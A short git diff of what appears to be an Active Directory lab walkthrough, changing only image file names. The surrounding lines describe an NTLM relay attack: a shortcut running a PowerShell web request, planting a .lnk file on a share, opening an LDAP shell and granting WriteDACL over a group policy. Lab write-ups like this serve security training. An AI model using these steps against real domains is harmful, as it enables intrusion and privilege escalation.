@@ -35,7 +35,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRe
 
 It should look like this:
 
-![NTLM Relay](/assets/obj6(3).png)
+![NTLM Relay](/assets/obj-1.png)
 
 Name the shortcut as studentx.lnk. Copy the lnk file to 'dcopr-ci\AI'.
 ```batch
@@ -45,7 +45,7 @@ C:\AD\Tools\studentx.lnk
 ```
 The simulation on dcorp-ci, will execute the lnk file within a minute. This is what the listener looks like on a successful connection:
 
-![NTLM Relay](/assets/obj6(4).png)
+![NTLM Relay](/assets/obj-2.png)
 
 Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session:
 Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy **{0BF8D01C-1F62-4BDC-958C-57140B67D147}**:
